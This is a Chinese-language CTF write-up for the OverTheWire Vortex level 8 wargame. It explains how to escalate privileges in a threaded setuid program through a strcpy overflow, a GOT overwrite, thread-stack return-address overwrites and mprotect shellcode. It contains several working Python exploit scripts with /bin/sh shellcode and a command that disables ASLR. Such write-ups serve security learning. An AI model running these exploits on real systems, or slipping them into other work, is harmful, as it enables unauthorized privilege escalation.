---
title: OverTheWire Vertex Level 8 → Level 9
author: Ripples
layout: post
permalink: /overthewire-vertex-level-8/
views:
  - 287
categories:
  - CTF
tags:
  - buffer overflow
  - reversing
  - vortex
  - wargame
  - WriteUp
---
<p style="text-indent: 2em;">
  前天心血来潮，决定再做一关vortex玩玩，结果真是做的痛哭流涕，心中从头到尾都感觉有千万只草泥马在奔腾不止，好在现在总算解决了。
</p>

<p style="text-indent: 2em;">
  原题参见<a href="http://overthewire.org/wargames/vortex/vortex8.html" target="_blank">这里</a>，题目很简洁，就说了让逆向给出的程序，那么我们首先通过逆向，仿写出如下程序：
</p>

<!--more-->

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;pthread.h&gt;
#include&nbsp;&lt;string.h&gt;

void&nbsp;*safecode(void&nbsp;*handle)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;while(1)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;var&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%dn",&nbsp;var);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fflush(stdout);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep(1);
&nbsp;&nbsp;&nbsp;&nbsp;}
}

void&nbsp;unsafecode(const&nbsp;char*&nbsp;arg0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buffer[1024];
&nbsp;&nbsp;&nbsp;&nbsp;strcpy(buffer,&nbsp;arg0);
}

int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;**argv)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;pthread_t&nbsp;tid;
&nbsp;&nbsp;&nbsp;&nbsp;pthread_create(&tid,&nbsp;NULL,&nbsp;safecode,&nbsp;NULL);
&nbsp;&nbsp;&nbsp;&nbsp;setresgid(getgid(),getgid(),getgid());
&nbsp;&nbsp;&nbsp;&nbsp;setresuid(getuid(),getuid(),getuid());
&nbsp;&nbsp;&nbsp;&nbsp;unsafecode(argv[1]);
}</pre>

<p style="text-indent: 2em;">
  我们发现，这道题首先新开了一个线程，然后丢掉所有权限后，调用了unsafecode，在unsafecode中很明显有个strcpy存在溢出漏洞，采取和上一关相同的方法，修改返回地址，我们可以很容易的使程序运行我们自己的payload，从而产生shell。但是，这个shell对于我们来说是没有意义的，因为程序已经没有了权限。
</p>

<p style="text-indent: 2em;">
  很显然，我们无法在程序丢掉所有权限之前控制住这个程序，那么我们想要获得权限，就只有想办法去利用unsafecode控制住safecode，因为safecode是在丢掉权限之前开启的线程，所以它还有我们所想要的权限。
</p>

<p style="text-indent: 2em;">
  仔细观察会发现，safecode在不停的调用printf、fflush、sleep，那么对于我们而言，最好的办法莫过于利用unsafecode狙击GOT表，由于同一进程中的不同线程共用GOT表，那么我们便可以使得safecode运行到我们设定的payload中去。
</p>

<p style="text-indent: 2em;">
  确认想法后，便开始实现，首先通过gdb，得到unsafecode的返回地址与buffer间需要填充的字符数，为1036。
</p>

<p style="text-indent: 2em;">
  紧接着通过：
</p>

<pre class="brush:bash;toolbar:false">objdump&nbsp;-j&nbsp;.plt&nbsp;-d&nbsp;vortex8</pre>

<p style="text-indent: 2em;">
  得到：
</p>

<pre class="brush:plain;toolbar:false;">08048490&nbsp;&lt;sleep@plt&gt;:
&nbsp;8048490:&nbsp;&nbsp;&nbsp;ff&nbsp;25&nbsp;08&nbsp;a0&nbsp;04&nbsp;08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;*0x804a008
&nbsp;8048496:&nbsp;&nbsp;&nbsp;68&nbsp;10&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;$0x10
&nbsp;804849b:&nbsp;&nbsp;&nbsp;e9&nbsp;c0&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;8048460&nbsp;&lt;_init+0x38&gt;</pre>

<p style="text-indent: 2em;">
  那么我们只要把0x804a008处的值改为我们的payload地址即可。
</p>

<p style="text-indent: 2em;">
  利用和前几关相同的方式，我们将payload放在环境变量中，那么，我们获取栈底地址，为0xffffe000。
</p>

<p style="text-indent: 2em;">
  然后，需要注意的是，我们要利用死循环使主线程不会立即结束，给子线程足够的时间去产生shell，那么我们得到攻击程序如下：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python

import&nbsp;subprocess

addr&nbsp;=&nbsp;&#39;x04xddxffxff&#39;
#&nbsp;x68x04xdfxffxff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pushl&nbsp;$0xffffdf04
#&nbsp;x8fx05x08xa0x04x08&nbsp;&nbsp;popl&nbsp;(0x0804a008)
#&nbsp;xebxfe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;self&nbsp;死循环
code&nbsp;=&nbsp;&#39;x68x04xdfxffxff&#39;&#39;x8fx05x08xa0x04x08&#39;&#39;xebxfe&#39;
shellcode&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
subprocess.Popen([&#39;/vortex/vortex8&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;1036&nbsp;+&nbsp;addr],&nbsp;env&nbsp;=&nbsp;{&#39;&#39;&nbsp;:&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;code&nbsp;+&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;shellcode}).communicate()</pre>

<p style="text-indent: 2em;">
  这里由于我们需要两次定位payload（第一次是定位unsafecode的返回到的位置，从而修改GOT表；第二次是修改后GOT表应指向的shellcode地址），所以设置了两个nop缓冲区。
</p>

<p style="text-indent: 2em;">
  运行程序，我们便可以得到shell，通过id命令，我们可以检查我们得到的shell的权限确实为：
</p>

<pre class="brush:plain;toolbar:false;">uid=5008(vortex8)&nbsp;gid=5008(vortex8)&nbsp;euid=5009(vortex9)&nbsp;groups=5009(vortex9),5008(vortex8)</pre>

<p style="text-indent: 2em;">
  至此，我们已经拿到了下一关的密码，但是游戏还没有结束，我们还可以尝试其它的方法。
</p>



<p style="text-indent: 2em;">
  看到有人想通过修改新线程栈中的返回地址来达到攻击的目的，结果失败了，于是好奇的研究了半天，最后终于发现了问题出在哪里。
</p>

<p style="text-indent: 2em;">
  首先讲下他实验的过程，实验开始前，先关闭ASLR：
</p>

<pre class="brush:bash;toolbar:false">echo&nbsp;0&nbsp;&gt;&nbsp;/proc/sys/kernel/randomize_va_space</pre>

<p style="text-indent: 2em;">
  然后输出新线程栈信息：
</p>

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;pthread.h&gt;
#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#define&nbsp;NUM_THREADS&nbsp;3

int&nbsp;getebp()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;__asm__("pop&nbsp;%eaxnpush&nbsp;%eax");
}

void&nbsp;*print_hello(void&nbsp;*threadid)&nbsp;{
&nbsp;&nbsp;&nbsp;int&nbsp;stack=0x41414141;
&nbsp;&nbsp;&nbsp;int&nbsp;stac2=0x42424242;
&nbsp;&nbsp;&nbsp;long&nbsp;tid&nbsp;=&nbsp;(long)threadid;
&nbsp;&nbsp;&nbsp;printf("thread&nbsp;#%ld!&nbsp;ebp:%p,stack:%pn"
&nbsp;&nbsp;&nbsp;&nbsp;"%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|"
&nbsp;&nbsp;&nbsp;&nbsp;"%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|n",
&nbsp;&nbsp;&nbsp;&nbsp;tid,&nbsp;getebp(),&nbsp;&stack);
&nbsp;&nbsp;&nbsp;pthread_exit(NULL);
}

int&nbsp;main&nbsp;(int&nbsp;argc,&nbsp;char&nbsp;*argv[])&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;t;
&nbsp;&nbsp;&nbsp;&nbsp;pthread_t&nbsp;threads[NUM_THREADS];
&nbsp;&nbsp;&nbsp;&nbsp;for(t=0;&nbsp;t&lt;NUM_THREADS;&nbsp;t++)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pthread_create(&threads[t],&nbsp;NULL,&nbsp;print_hello,&nbsp;(void&nbsp;*)t);
&nbsp;&nbsp;&nbsp;&nbsp;pthread_exit(NULL);
}</pre>

<p style="text-indent: 2em;">
  得到：
</p>

<pre class="brush:plain;toolbar:false">thread&nbsp;#0!&nbsp;ebp:0xf7e3b398,stack:0xf7e3b38c
f7e45e00|00000000|42424242|41414141|f7e3b498|f7ff3ce0|f7e3b498|f7f9d96e|
00000000|f7e3bb70|f7e3bb70|f7e3bb70|f7e3b454|00000000|00000000|00000000|
00000000|00000000|f7e3bb70|00000000|00000000|00000000|00000000|00000000|
thread&nbsp;#1!&nbsp;ebp:0xf763a398,stack:0xf763a38c
00000000|00000001|42424242|41414141|00000000|00000000|f763a498|f7f9d96e|
00000001|f763ab70|f763ab70|f763ab70|f763a454|00000000|00000000|00000000|
00000000|00000000|f763ab70|00000000|00000000|00000000|00000000|00000000|
thread&nbsp;#2!&nbsp;ebp:0xf6e39398,stack:0xf6e3938c
00000000|00000002|42424242|41414141|00000000|00000000|f6e39498|f7f9d96e|
00000002|f6e39b70|f6e39b70|f6e39b70|f6e39454|00000000|00000000|00000000|
00000000|00000000|f6e39b70|00000000|00000000|00000000|00000000|00000000|</pre>

<p style="text-indent: 2em;">
  紧接着，利用得到的栈地址，修改栈中返回地址，指向win函数：
</p>

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;pthread.h&gt;
#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#define&nbsp;NUM_THREADS&nbsp;2
#define&nbsp;sleep(x)&nbsp;{printf("s:%dn",x);&nbsp;sleep(x);&nbsp;};

void&nbsp;win()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf("WINn");
&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
}

void&nbsp;*print_hello(void&nbsp;*threadid)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;for(;;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;printf("FORn");
&nbsp;&nbsp;&nbsp;&nbsp;sleep(3);
&nbsp;&nbsp;&nbsp;&nbsp;}
}

int&nbsp;main&nbsp;(int&nbsp;argc,&nbsp;char&nbsp;*argv[])&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;t;
&nbsp;&nbsp;&nbsp;&nbsp;pthread_t&nbsp;threads[NUM_THREADS];
&nbsp;&nbsp;&nbsp;&nbsp;for(t=0;&nbsp;t&lt;NUM_THREADS;&nbsp;t++)
&nbsp;&nbsp;&nbsp;&nbsp;pthread_create(&threads[t],&nbsp;NULL,&nbsp;print_hello,&nbsp;(void&nbsp;*)t);
&nbsp;&nbsp;&nbsp;&nbsp;sleep(1);
&nbsp;&nbsp;&nbsp;&nbsp;printf("OVERWRITEn");
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;addr&nbsp;=&nbsp;0xf7e3b398;
&nbsp;&nbsp;&nbsp;&nbsp;for(t=0;t&lt;16;t++)
&nbsp;&nbsp;&nbsp;&nbsp;*((unsigned&nbsp;int*)addr+t-16)=&win;
&nbsp;&nbsp;&nbsp;&nbsp;sleep(5);
&nbsp;&nbsp;&nbsp;&nbsp;printf("FAILn");
}</pre>

<p style="text-indent: 2em;">
  得到：
</p>

<pre class="brush:plain;toolbar:false">FOR
s:3
FOR
s:3
s:1
OVERWRITE
s:5
WIN</pre>

<p style="text-indent: 2em;">
  成功执行了win函数，于是在win中添加：
</p>

<pre class="brush:cpp;toolbar:false">setreuid(0,0);
execlp("/bin/sh",&nbsp;"bin/sh",&nbsp;NULL);</pre>

<p style="text-indent: 2em;">
  得到结果：
</p>

<pre class="brush:plain;toolbar:false">FOR
s:3
FOR
s:3
s:1
OVERWRITE
s:5
FOR
s:3
WIN
FAIL
FOR</pre>

<p style="text-indent: 2em;">
  发现了一个奇怪的现象，即在win函数执行的时候，主线程也执行并结束了，通过debug，他判断出问题出在setreuid上。
</p>

<p style="text-indent: 2em;">
  本人于是按照他的思路尝试了一遍，果然出现了和他一样神奇的状况（话说似乎我还成功过了一次，仅一次！），然后注释掉setreuid后，果然是次次都能出shell，于是乎百思不得其解，各种查资料，最后总算是在各种资料堆和实验之中，找到了原因。
</p>

<p style="text-indent: 2em;">
  下面我们就来解释一下：
</p>

<p style="text-indent: 2em;">
  首先我们发现FAIL被输出了，也就是说程序并不是非正常终止，只是sleep函数似乎出了什么问题，并没有等到我们设定的时间，通过查资料，我们也发现了，sleep函数退出有两种情况：一是正常退出，返回0；二是有信号中断发生，返回剩余秒数。那么也就是说我们的实验中sleep函数接收到了信号中断。
</p>

<p style="text-indent: 2em;">
  尝试把sleep(5)替换成死循环for (;;);或者再增加一句sleep(5)后，发现，次次都能成功得到shell，也就是说我们之前的判断应该是正确的。然而，当我们通过signal函数设置捕获所有信号的时候，却发现什么信号都捕获不到。这下就让我迷惑了，资料中都说，捕获不到的信号是SIGKILL和SIGSTOP，然而，我们这里显然不会是这两种信号，因为我们的程序仍旧是正常在执行。
</p>

<p style="text-indent: 2em;">
  那么问题到底应该是出在了什么地方呢？仔细观察我们会发现，网上几乎所有的资料中，都无视了两个信号，编号为32和33的信号，这便是关键所在了，32号信号是SIGCANCEL，33号信号是SIGSETXID，这两个信号可能是与系统相关，具体不清楚，但至少在我的Ubuntu中应该是这样了，通过33号信号的名字就很明显可以看出，这个信号绝对跟setuid有着不解的联系。通过gdb，我们也会发现，我们的程序进入了一个叫做sighandler_setxid的函数中，一看便觉得这是SIGSETXID的信号处理函数。
</p>

<p style="text-indent: 2em;">
  最后，为了进一步确认我的想法，我写了个程序来测试：
</p>

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;pthread.h&gt;

void&nbsp;*sub()
{
&nbsp;&nbsp;&nbsp;&nbsp;sleep(1);
&nbsp;&nbsp;&nbsp;&nbsp;printf("Setuidn");
&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);
}

void&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;pthread_t&nbsp;x;
&nbsp;&nbsp;&nbsp;&nbsp;pthread_create(&x,&nbsp;NULL,&nbsp;&sub,&nbsp;NULL);
&nbsp;&nbsp;&nbsp;&nbsp;printf("Beginn");
&nbsp;&nbsp;&nbsp;&nbsp;pause();
&nbsp;&nbsp;&nbsp;&nbsp;//sleep(5);
&nbsp;&nbsp;&nbsp;&nbsp;printf("Endn");
}</pre>

<p style="text-indent: 2em;">
  会发现Setuid和End是在同一时间输出，然后程序结束，同时程序的errno为4（通过echo $?可以看到），代表Interrupted system call。而在注释掉setuid(0)后，程序输出了Setuid后便会一直停在那里等候，不会结束。
</p>

<p style="text-indent: 2em;">
  至此，我们便分析清楚了之前问题的原因，这也很好的解释了为什么之前实验中我会有一次成功（由于在不同的线程，那次setreuid在主线程的sleep(5)开始前运行），那么通过这种方法来破掉这一关应该也是可行的。
</p>

<p style="text-indent: 2em;">
  首先通过gdb，我们获取到子线程的ebp为0xf7e0b368，可以大概估计位置修改，这里我就利用gdb调试的结果精确定位了，子线程中sleep函数返回地址存在0xf7e0b33c，将该位置改为0xffffdf04即可。
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python

import&nbsp;subprocess

addr&nbsp;=&nbsp;&#39;x04xddxffxff&#39;
#&nbsp;xb9x3cxb3xe0xf7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;$0xf7e0b33c,&nbsp;%ecx
#&nbsp;xc7x01x04xdfxffxff&nbsp;&nbsp;movl&nbsp;$0xffffdf04,&nbsp;(%ecx)
#&nbsp;xebxfe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;self&nbsp;死循环
code&nbsp;=&nbsp;&#39;xb9x3cxb3xe0xf7&#39;&#39;xc7x01x04xdfxffxff&#39;&#39;xebxfe&#39;
shellcode&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
subprocess.Popen([&#39;/vortex/vortex8&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;1036&nbsp;+&nbsp;addr],&nbsp;env&nbsp;=&nbsp;{&#39;&#39;&nbsp;:&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;code&nbsp;+&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;shellcode}).communicate()</pre>

<p style="text-indent: 2em;">
  然而，运行却发现，我们的程序没有能够打开一个shell，而是不停的输出0，也就是说，我们修改返回地址没能奏效。于是我利用gdb的attach将gdb附加在那个没有停止的程序上，查看0xf7dec33c处的值，果然不是我们设定值，而主线程确实是在我们'xebxfe'设定的死循环处，那我们手动将主线程的eip调整到code的开头处，继续执行，便会发现，成功的打开了shell，屡试不爽。
</p>

<p style="text-indent: 2em;">
  然后再多次重复运行我们的程序后，突然发现，有时候又能够正常弹出shell，这个现象让我们不禁联想到了前面的实验，之前是由于不同线程语句执行顺序导致的，那按照这个思路，仔细想想这次，便会发现，有可能在我们修改返回地址之前，子线程都还没有调用任何函数，这显然会使得我们的修改失去意义。
</p>

<p style="text-indent: 2em;">
  于是，我们给主线程增加一个sleep(2)，延迟修改返回地址，然后再运行我们的程序，便会发现成功获取了shell。其实，我们现在的程序仍旧是可能获取不到shell的，有可能当我们修改返回地址的那个瞬间，正好子线程已经从sleep中返回而又没有来得及再调用，只是这种情况发生的概率较小（个人实验是这样），所以我们可以无视，大不了挂了重新再跑一次就好。于是最终的程序如下：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python

import&nbsp;subprocess

addr&nbsp;=&nbsp;&#39;x04xddxffxff&#39;
#&nbsp;x6ax02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;$0x2
#&nbsp;xbbx90x84x04x08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;$0x8048490,&nbsp;%ebx
#&nbsp;xffxd3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;*%ebx
#&nbsp;xb9x3cxb3xe0xf7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;$0xf7e0b33c,&nbsp;%ecx
#&nbsp;xc7x01x04xdfxffxff&nbsp;&nbsp;movl&nbsp;$0xffffdf04,&nbsp;(%ecx)
#&nbsp;xebxfe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;self&nbsp;死循环
code&nbsp;=&nbsp;&#39;x6ax02&#39;&#39;xbbx90x84x04x08&#39;&#39;xffxd3&#39;&#39;xb9x3cxb3xe0xf7&#39;&#39;xc7x01x04xdfxffxff&#39;&#39;xebxfe&#39;
shellcode&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
subprocess.Popen([&#39;/vortex/vortex8&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;1036&nbsp;+&nbsp;addr],&nbsp;env&nbsp;=&nbsp;{&#39;&#39;&nbsp;:&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;code&nbsp;+&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;shellcode}).communicate()</pre>



<p style="text-indent: 2em;">
  接下来，我们再尝试一种方法：
</p>

<p style="text-indent: 2em;">
  想要改变一个程序的执行过程，其实最直接的想法便是修改其代码，当然，正常情况下，代码段是不可写的，那我们如何去修改代码段呢？要注意，我们通过unsafecode已经获得了操纵了这个程序，只是，我们没有需要的权限而已，但是，我们是拥有对这个程序自身操作的所有权限的。那么，这也就意味着，我们可以通过mprotect将代码段改为可写的。
</p>

<p style="text-indent: 2em;">
  由于这个程序本身是没有调用过mprotect的，在PLT表中没有mprotect，我们无法直接调用mprotect，但是我们可以通过system call直接调用，Linux的system call是通过软中断0x<a></a>80实现，在/usr/include/asm/unistd.h中，我们可以看到mprotect的系统调用号，也可以通过gdb来查看。
</p>

<p style="text-indent: 2em;">
  通过gdb，我们可以得到：
</p>

<pre class="brush:plain;toolbar:false;">0xf7ef72b1&nbsp;&lt;mprotect+1&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0x10(%esp),%edx
0xf7ef72b5&nbsp;&lt;mprotect+5&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0xc(%esp),%ecx
0xf7ef72b9&nbsp;&lt;mprotect+9&gt;:&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;0x8(%esp),%ebx
0xf7ef72bd&nbsp;&lt;mprotect+13&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x7d,%eax
0xf7ef72c2&nbsp;&lt;mprotect+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;*%gs:0x10</pre>

<p style="text-indent: 2em;">
  从而知道了各个参数与寄存器之间的对应关系，于是我们得到的攻击程序如下：
</p>

<pre class="brush:python;toolbar:false;">#!/usr/bin/env&nbsp;python

import&nbsp;subprocess

addr&nbsp;=&nbsp;&#39;x04xdfxffxff&#39;
#&nbsp;x31xc0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;%eax,&nbsp;%eax
#&nbsp;x31xc9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;%ecx,&nbsp;%ecx
#&nbsp;x31xd2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;%edx,&nbsp;%edx
#&nbsp;xb2x07&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;$0x7,&nbsp;%dl
#&nbsp;x66xb9x01x10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;$0x1001,&nbsp;%cx
#&nbsp;x30xc9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;%cl,&nbsp;%cl
#&nbsp;xbbx01x80x04x08&nbsp;&nbsp;mov&nbsp;$0x8048001,&nbsp;%ebx
#&nbsp;x30xdb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;%bl,&nbsp;%bl
#&nbsp;xb0x7d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;$0x7d,&nbsp;%al
#&nbsp;xcdx80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;$0x80&nbsp;&nbsp;&nbsp;call&nbsp;mprotect
#&nbsp;x68...x08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;shellcode,&nbsp;(0x80485fe)
#&nbsp;xebxfe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;self&nbsp;死循环
code&nbsp;=&nbsp;&#39;x31xc0x31xc9x31xd2xb2x07x66xb9x01x10x30xc9xbbx01x80x04x08x30xdbxb0x7dxcdx80&#39;&#39;x68x6ax0bx58x99x8fx05xfex85x04x08x68x31xc9x52x68x8fx05x02x86x04x08x68x2fx2fx73x68x8fx05x06x86x04x08x68x68x2fx62x69x8fx05x0ax86x04x08x68x6ex89xe3xcdx8fx05x0ex86x04x08xb0x80xa2x12x86x04x08&#39;&#39;xebxfe&#39;
shellcode&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
subprocess.Popen([&#39;/vortex/vortex8&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;1036&nbsp;+&nbsp;addr],&nbsp;env&nbsp;=&nbsp;{&#39;&#39;&nbsp;:&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;code}).communicate()</pre>

<p style="text-indent: 2em;">
  我们需要注意的是，code中要避免出现x00导致字符串中断（call *%gs:0x<a></a>10中含有x00，而int $0x<a></a>80中没有），当然，在这题里面，由于code不需要strcpy复制，故而我们也有办法处理x00的情况，但毕竟不如直接避免x00来的方便。
</p>

<p style="text-indent: 2em;">
  至此，我们就结束了这一关的征程，也从这一关中收获了许多。
</p>
